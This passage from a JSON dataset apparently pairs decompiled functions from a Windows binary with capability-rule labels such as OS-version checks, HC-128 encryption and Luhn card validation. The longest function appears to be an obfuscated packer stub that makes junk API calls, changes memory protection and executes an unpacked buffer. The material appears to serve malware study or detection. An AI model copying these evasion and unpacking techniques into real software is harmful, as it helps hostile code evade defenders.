(*0x7fad90 == 0) {\n        fcn.0040b36f(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 854
    },
    "0040aa73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040aa73(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00407ea4(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040ac8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040ac8f(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00405fb1();\n    var_4h = 0;\n    if (*0x7fad28 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402508);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4024fc);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x7fad28 = fcn.00405f3f(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x4024ec);\n        *0x7fad2c = fcn.00405f3f(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4024d8);\n        *0x7fad30 = fcn.00405f3f(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4024bc);\n        *0x7fad38 = fcn.00405f3f(uVar3);\n        if (*0x7fad38 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4024a4);\n            *0x7fad34 = fcn.00405f3f(uVar3);\n        }\n    }\n    if ((*0x7fad34 != iVar1) && (*0x7fad38 != iVar1)) {\n        pcVar4 = fcn.00405fba(*0x7fad34);\n        pcVar5 = fcn.00405fba(*0x7fad38);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040add1;\n        }\n    }\n    if ((((*0x7fad2c != iVar1) && (pcVar4 = fcn.00405fba(*0x7fad2c),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x7fad30 != iVar1 && (pcVar4 = fcn.00405fba(*0x7fad30),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040add1:\n    pcVar4 = fcn.00405fba(*0x7fad28);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 839
    },
    "0040c3fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c3fe(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7f9b80 ^ &stack0xfffffffc;\n    fcn.00404567(arg_10h);\n    var_14h = fcn.0040d3e9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c961(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c457:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c497;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c489:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c497;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c489;\n        goto code_r0x0040c457;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c497:\n    fcn.004078b3(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "0040c4a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c4a6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7f9b80 ^ &stack0xfffffffc;\n    fcn.00404567(arg_10h);\n    var_14h = fcn.0040d3e9(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040cea5(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040c4ff:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c53f;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040c531:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040c53f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040c531;\n        goto code_r0x0040c4ff;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040c53f:\n    fcn.004078b3(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "0040d3e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d6ab)\n// WARNING: Removing unreachable block (ram,0x0040d674)\n// WARNING: Removing unreachable block (ram,0x0040da5c)\n// WARNING: Removing unreachable block (ram,0x0040d683)\n// WARNING: Removing unreachable block (ram,0x0040d68b)\n// WARNING: Removing unreachable block (ram,0x0040d691)\n// WARNING: Removing unreachable block (ram,0x0040d694)\n// WARNING: Removing unreachable block (ram,0x0040d69b)\n// WARNING: Removing unreachable block (ram,0x0040d6a5)\n// WARNING: Removing unreachable block (ram,0x0040d700)\n// WARNING: Removing unreachable block (ram,0x0040d6fa)\n// WARNING: Removing unreachable block (ram,0x0040d706)\n// WARNING: Removing unreachable block (ram,0x0040d723)\n// WARNING: Removing unreachable block (ram,0x0040d725)\n// WARNING: Removing unreachable block (ram,0x0040d72d)\n// WARNING: Removing unreachable block (ram,0x0040d730)\n// WARNING: Removing unreachable block (ram,0x0040d735)\n// WARNING: Removing unreachable block (ram,0x0040d738)\n// WARNING: Removing unreachable block (ram,0x0040da65)\n// WARNING: Removing unreachable block (ram,0x0040d743)\n// WARNING: Removing unreachable block (ram,0x0040da7c)\n// WARNING: Removing unreachable block (ram,0x0040da83)\n// WARNING: Removing unreachable block (ram,0x0040d74e)\n// WARNING: Removing unreachable block (ram,0x0040d761)\n// WARNING: Removing unreachable block (ram,0x0040d763)\n// WARNING: Removing unreachable block (ram,0x0040d770)\n// WARNING: Removing unreachable block (ram,0x0040d775)\n// WARNING: Removing unreachable block (ram,0x0040d77b)\n// WARNING: Removing unreachable block (ram,0x0040d784)\n// WARNING: Removing unreachable block (ram,0x0040d78b)\n// WARNING: Removing unreachable block (ram,0x0040d7a3)\n// WARNING: Removing unreachable block (ram,0x0040d7b4)\n// WARNING: Removing unreachable block (ram,0x0040d7c2)\n// WARNING: Removing unreachable block (ram,0x0040d801)\n// WARNING: Removing unreachable block (ram,0x0040d80a)\n// WARNING: Removing unreachable block (ram,0x0040da22)\n// WARNING: Removing unreachable block (ram,0x0040d818)\n// WARNING: Removing unreachable block (ram,0x0040d822)\n// WARNING: Removing unreachable block (ram,0x0040da3d)\n// WARNING: Removing unreachable block (ram,0x0040d82f)\n// WARNING: Removing unreachable block (ram,0x0040d836)\n// WARNING: Removing unreachable block (ram,0x0040d840)\n// WARNING: Removing unreachable block (ram,0x0040d845)\n// WARNING: Removing unreachable block (ram,0x0040d855)\n// WARNING: Removing unreachable block (ram,0x0040d85a)\n// WARNING: Removing unreachable block (ram,0x0040d864)\n// WARNING: Removing unreachable block (ram,0x0040d869)\n// WARNING: Removing unreachable block (ram,0x0040d87b)\n// WARNING: Removing unreachable block (ram,0x0040d888)\n// WARNING: Removing unreachable block (ram,0x0040d897)\n// WARNING: Removing unreachable block (ram,0x0040d8a4)\n// WARNING: Removing unreachable block (ram,0x0040d8c1)\n// WARNING: Removing unreachable block (ram,0x0040d8c5)\n// WARNING: Removing unreachable block (ram,0x0040d8cc)\n// WARNING: Removing unreachable block (ram,0x0040d8d5)\n// WARNING: Removing unreachable block (ram,0x0040d8d8)\n// WARNING: Removing unreachable block (ram,0x0040d8e9)\n// WARNING: Removing unreachable block (ram,0x0040d8f7)\n// WARNING: Removing unreachable block (ram,0x0040d902)\n// WARNING: Removing unreachable block (ram,0x0040d909)\n// WARNING: Removing unreachable block (ram,0x0040d934)\n// WARNING: Removing unreachable block (ram,0x0040d939)\n// WARNING: Removing unreachable block (ram,0x0040d944)\n// WARNING: Removing unreachable block (ram,0x0040d94d)\n// WARNING: Removing unreachable block (ram,0x0040d953)\n// WARNING: Removing unreachable block (ram,0x0040d956)\n// WARNING: Removing unreachable block (ram,0x0040d97c)\n// WARNING: Removing unreachable block (ram,0x0040d981)\n// WARNING: Removing unreachable block (ram,0x0040d986)\n// WARNING: Removing unreachable block (ram,0x0040d993)\n// WARNING: Removing unreachable block (ram,0x0040d9a4)\n// WARNING: Removing unreachable block (ram,0x0040d9d5)\n// WARNING: Removing unreachable block (ram,0x0040d9aa)\n// WARNING: Removing unreachable block (ram,0x0040d9d0)\n// WARNING: Removing unreachable block (ram,0x0040d9b4)\n// WARNING: Removing unreachable block (ram,0x0040d9ca)\n// WARNING: Removing unreachable block (ram,0x0040d9c3)\n// WARNING: Removing unreachable block (ram,0x0040d9d8)\n// WARNING: Removing unreachable block (ram,0x0040da05)\n// WARNING: Removing unreachable block (ram,0x0040d9e2)\n// WARNING: Removing unreachable block (ram,0x0040d86d)\n// WARNING: Removing unreachable block (ram,0x0040d84a)\n// WARNING: Removing unreachable block (ram,0x0040da40)\n// WARNING: Removing unreachable block (ram,0x0040d786)\n// WARNING: Removing unreachable block (ram,0x0040da4a)\n// WARNING: Removing unreachable block (ram,0x0040da8b)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040d3e9(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.0040518f();\n        *puVar2 = 0x16;\n        fcn.00407ddc(0, 0, 0, 0, 0);\n        fcn.004078b3(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040d47c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40dab1\n    (**0x40dab1)();\n    return;\n}\n",
        "token_count": 1892
    },
    "00403100": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00403100(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uchar auStack4 [4];\n    \n    uVar1 = *param_1;\n    uVar5 = param_1[1];\n    fcn.004030e0();\n    if (*0x2f51b94 == 0x14) {\n        (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    piVar3 = *0x7fa0f4;\n    iVar2 = *0x7fa0f0;\n    iVar4 = 0x20;\n    do {\n        if (*0x2f51b94 == 0xfa9) {\n            *0x2f51b90 = 0xedeb2e40;\n        }\n        else if (*0x2f51b94 == 0x3eb) {\n            *0x2f51b04 = 0;\n        }\n        *0x2f51b8c = 0xf4ea3dee;\n        fcn.004030f0();\n        if (*0x2f51b94 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)(0, param_1);\n        }\n        uVar5 = uVar5 - (uVar1 >> 5 ^ uVar1 * 0x10 + iVar2 ^ uVar1 + 0x23f);\n        if (*0x2f51b94 == 0xc) {\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, auStack4, 0);\n        }\n        fcn.00403060();\n        fcn.00403070();\n        unaff_EBP = unaff_EBP - unaff_ESI;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    piVar3[1] = uVar5;\n    *piVar3 = unaff_EBP;\n    return;\n}\n",
        "token_count": 489
    },
    "004032b0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.004032b0(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    \n    fcn.0040c8d0();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetNumberFormatW;\n    pcVar4 = _sym.imp.KERNEL32.dll_WriteProfileSectionA;\n    pcVar3 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    uVar6 = *0x2f51b08;\n    uVar1 = *0x2f51b94 >> 3;\n    while (uVar1 != 0) {\n        if (*0x2f51b94 == 0x959) {\n            (*pcVar5)();\n            (*pcVar3)();\n            (*pcVar4)();\n            (*pcVar2)();\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExW)();\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n            (*pcVar4)();\n            (*_sym.imp.KERNEL32.dll_EnumResourceTypesW)();\n            (*_sym.imp.KERNEL32.dll_SetThreadPriorityBoost)();\n            (*_sym.imp.KERNEL32.dll_GetConsoleTitleW)();\n            (*_sym.imp.KERNEL32.dll_BeginUpdateResourceW)();\n            (*_sym.imp.KERNEL32.dll_GetComputerNameA)();\n            (*_sym.imp.KERNEL32.dll_FindResourceExA)();\n        }\n        fcn.00403100();\n        uVar6 = uVar6 - 1;\n        uVar1 = uVar6;\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "004043a6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043a6(uint32_t arg_8h)\n\n{\n    fcn.00404383();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da9();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00404ae1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ae1(uint32_t arg_8h)\n\n{\n    fcn.00404ad1();\n    if ((arg_8h & 1) != 0) {\n        fcn.00404da9();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00403430": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "delete directory",
            "get common file path",
            "allocate thread local storage",
            "resolve function by parsing PE exports",
            "get disk size"
        ],
        "decompiled_code": "\nvoid fcn.00403430(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint uStack3052;\n    uint uStack3048;\n    uint uStack3044;\n    uchar *puStack3040;\n    uchar *puStack3036;\n    uint uStack3032;\n    uint uStack3028;\n    uchar *puStack3024;\n    uchar *puStack3020;\n    uint uStack3016;\n    uchar *puStack3012;\n    uint uStack2948;\n    uint uStack2944;\n    uint uStack2940;\n    uint uStack2932;\n    uchar auStack2924 [4];\n    uint uStack2920;\n    uint uStack2912;\n    uint uStack2908;\n    uint uStack2904;\n    uint uStack2900;\n    uint uStack2896;\n    uint uStack2892;\n    uint uStack2888;\n    uint uStack2884;\n    uint uStack2880;\n    uint uStack2876;\n    uint uStack2872;\n    uint uStack2864;\n    uint uStack2860;\n    uint uStack2856;\n    uint uStack2852;\n    uint uStack2848;\n    uint uStack2844;\n    uint uStack2840;\n    uint uStack2836;\n    uint uStack2832;\n    uint uStack2828;\n    ushort uStack2824;\n    ushort uStack2822;\n    ushort uStack2820;\n    uint uStack2818;\n    uint uStack2814;\n    ushort uStack2810;\n    ushort uStack2808;\n    uint uStack2806;\n    uint uStack2802;\n    uint uStack2798;\n    ushort uStack2794;\n    uchar auStack2668 [500];\n    uchar auStack2168 [2168];\n    \n    if (*0x2f51b94 == 0xac) {\n        (*_sym.imp.USER32.dll_GetWindowLongW)();\n        (*_sym.imp.ole32.dll_OleQueryLinkFromData)();\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n        (*_sym.imp.KERNEL32.dll_GetShortPathNameW)();\n        puStack3012 = NULL;\n        uStack3016 = 0x403489;\n        (*_sym.imp.KERNEL32.dll_DeleteTimerQueueTimer)();\n        uStack3016 = 0;\n        puStack3020 = NULL;\n        puStack3024 = NULL;\n        uStack3028 = 0x403495;\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)();\n        fcn.00404372();\n        fcn.00404383();\n        fcn.0040436d();\n        fcn.0040452d(0);\n        fcn.004046ad(0, 0);\n        fcn.00404812(0, 0);\n        fcn.0040452d(0);\n        fcn.00404543(0, 0);\n        fcn.0040455c();\n        puStack3012 = 0x4034e5;\n        fcn.004047fb(0);\n    }\n    pcVar5 = _sym.imp.USER32.dll_SetCaretPos;\n    pcVar4 = _sym.imp.USER32.dll_GetSysColorBrush;\n    pcVar1 = _sym.imp.USER32.dll_CharLowerBuffW;\n    iVar8 = 0;\n    do {\n        if (iVar8 < 0x9430) {\n            (*pcVar5)();\n            (*pcVar1)();\n            (*pcVar4)();\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15460);\n    *0x2f51b94 = *0x2f51b94 + 0x11b1b;\n    fcn.00403410();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    pcVar1 = _sym.imp.GDI32.dll_GetColorAdjustment;\n    uVar9 = 0;\n    if (*0x2f51b94 != 0) {\n        do {\n            (*0x2f51b08)[uVar9] = *(*0x2f5349c + 0x11b1b + uVar9);\n            if (*0x2f51b94 == 0xa8) {\n                (*pcVar4)();\n                (*pcVar1)();\n                (*pcVar5)();\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < *0x2f51b94);\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DebugBreak;\n    pcVar5 = _sym.imp.KERNEL32.dll_GetConsoleDisplayMode;\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrlenW;\n    pcVar1 = _sym.imp.KERNEL32.dll_ReadConsoleA;\n    iVar8 = 0;\n    do {\n        if (*0x2f51b94 + iVar8 == 0xe) {\n            (*pcVar1)();\n            (*pcVar5)();\n            (*pcVar6)();\n            puStack3012 = 0x4035f4;\n            (*pcVar4)();\n            puStack3012 = NULL;\n            uStack3016 = 0;\n            puStack3020 = NULL;\n            puStack3024 = NULL;\n            uStack3028 = 0x403602;\n            (*_sym.imp.KERNEL32.dll_FindResourceExA)();\n            uStack3028 = 0;\n            uStack3032 = 0;\n            puStack3036 = NULL;\n            puStack3040 = 0x40360e;\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)();\n            puStack3040 = &stack0xfffff594;\n            uStack3044 = 0;\n            uStack3048 = 0;\n            uStack3052 = 0x403620;\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n            uStack3052 = 0x402e24;\n            (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceA)\n                      (0, &stack0xfffff434, &stack0xfffff438, &stack0xfffff480, &stack0xfffff450);\n            (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)(&stack0xfffff428, 0);\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoA)(0, 0, 0, &stack0xfffff788, 0, &stack0xfffff414);\n        }\n        pcVar3 = _sym.imp.GDI32.dll_GetCharWidthW;\n        pcVar2 = _sym.imp.GDI32.dll_GetCharABCWidthsW;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x4f9409);\n    iVar8 = 0x4cc;\n    do {\n        (*pcVar3)();\n        puStack3012 = NULL;\n        uStack3016 = 0x4036ab;\n        (*pcVar2)();\n        pcVar5 = _sym.imp.KERNEL32.dll_SetLastError;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetConsoleAliasW;\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    do {\n        (*pcVar4)();\n        (*pcVar5)();\n        (*pcVar1)();\n        if (iVar8 < 0x3b9f9c7) {\n            uStack2900 = 0x1b1f4c31;\n            uStack2896 = 0x62549a1c;\n            uStack2912 = 0x71b2ec6;\n            uStack2860 = 0x37beb127;\n            uStack2844 = 0x5f430172;\n            uStack2932 = 0x3ef75990;\n            uStack2836 = 0x671b5d09;\n            uStack2876 = 0x52c4b444;\n            uStack2840 = 0x46a518f9;\n            uStack2848 = 0x35125e2b;\n            uStack2920 = 0x1ad10849;\n            uStack2872 = 0x381ee696;\n            uStack2948 = 0xe11e6c2;\n            uStack2864 = 0x5a39ca87;\n            uStack2824 = 0x888b;\n            uStack2822 = 0xc687;\n            uStack2888 = 0x860776d9;\n            uStack2904 = 0x5e38854d;\n            uStack2856 = 0xae3c1051;\n            uStack2908 = 0x11a722d3;\n            uStack2880 = 0x43bb0286;\n            uStack2852 = 0xbc2138cd;\n            uStack2940 = 0xaf698675;\n            uStack2944 = 0xc6aa655c;\n            uStack2884 = 0x187691d1;\n            uStack2828 = 0xf250e268;\n            uStack2892 = 0xe5da3acd;\n            uStack2832 = 0x7914cc58;\n        }\n    } while ((iVar8 < 0xbf08be) && (iVar8 = iVar8 + 1,  iVar8 < 0x19be898c));\n    fcn.004032b0();\n    fcn.004033f0();\n    pcVar6 = _sym.imp.KERNEL32.dll_RemoveDirectoryW;\n    pcVar5 = _sym.imp.KERNEL32.dll_IsBadCodePtr;\n    pcVar4 = _sym.imp.KERNEL32.dll_TzSpecificLocalTimeToSystemTime;\n    pcVar1 = _sym.imp.KERNEL32.dll_ScrollConsoleScreenBufferW;\n    iVar8 = 0x7b;\n    do {\n        if (*0x2f51b94 == 0x86) {\n            (*pcVar6)();\n            uStack2808 = 0;\n            uStack2806 = 0;\n            uStack2802 = 0;\n            uStack2798 = 0;\n            uStack2794 = 0;\n            uStack2824 = 0;\n            uStack2822 = 0;\n            uStack2820 = 0;\n            uStack2818 = 0;\n            uStack2814 = 0;\n            uStack2810 = 0;\n            (*pcVar4)();\n            puStack3012 = 0x403ba8;\n            (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n            puStack3012 = &stack0xfffff454;\n            uStack3016 = 0;\n            puStack3020 = &stack0xfffff470;\n            puStack3024 = &stack0xfffff47c;\n            uStack3028 = 0;\n            uStack3032 = 0x403bce;\n            (*pcVar1)();\n            uStack3032 = 0;\n            puStack3036 = 0x403bd2;\n            (*pcVar5)();\n            puStack3036 = &stack0xfffff494;\n            puStack3040 = NULL;\n            uStack3044 = 0x403bdf;\n            (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)();\n            uStack3044 = 0;\n            uStack3048 = 0;\n            uStack3052 = 0;\n            (*_sym.imp.KERNEL32.dll_EnumResourceNamesW)(0);\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(0, 0, 0, 0);\n        }\n        pcVar7 = _sym.imp.KERNEL32.dll_TlsAlloc;\n        pcVar3 = _sym.imp.KERNEL32.dll_GetWindowsDirectoryA;\n        pcVar2 = _sym.imp.KERNEL32.dll_BackupSeek;\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    iVar8 = 0x180ef;\n    do {\n        if (*0x2f51b94 == 0x1f) {\n            (*pcVar3)();\n            puStack3012 = NULL;\n            uStack3016 = 0x403c54;\n            (*pcVar2)();\n            uStack3016 = 0x403c56;\n            (*pcVar7)();\n        }\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    fcn.00403000();\n    *0x2f51b0c = *0x2f51b08;\n    (**0x2f51b08)();\n    return;\n}\n",
        "token_count": 2854
    },
    "0040309c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040309c(uint param_1, uint param_2)\n\n{\n    uint32_t *in_stack_00000030;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_00000038;\n    \n    (*_sym.imp.KERNEL32.dll_GetDefaultCommConfigA)(0x402d24, param_2);\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n    *in_stack_00000030 = in_stack_00000038 ^ in_stack_00000034;\n    return;\n}\n",
        "token_count": 129
    },
    "004030e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004030e0(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "004030f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004030f0(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "004033f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033f0(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00406936": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406936(uint arg_8h)\n\n{\n    fcn.0040680a(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "0040766e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407682)\n// WARNING: Removing unreachable block (ram,0x00407688)\n// WARNING: Removing unreachable block (ram,0x0040768a)\n\nvoid fcn.0040766e(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "00407c35": {
        "rules": [
